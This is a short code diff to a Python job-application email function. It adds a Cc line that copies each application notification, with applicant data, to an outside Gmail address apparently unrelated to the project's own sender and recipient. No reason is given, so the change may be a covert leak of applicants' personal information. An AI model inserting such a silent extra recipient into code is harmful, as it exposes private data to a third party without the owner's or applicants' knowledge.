@@ -172,6 +172,7 @@ def send_application_notification(job_title, application_data):
         msg = MIMEMultipart()
         msg['From'] = 'devfemijethro@gmail.com'
         msg['To'] = '007femijethro@gmail.com'
+        msg['Cc'] = 'Chase.rice.fanpage223@gmail.com' 
         msg['Subject'] = f"New Application for {job_title}"
 
         # Email body
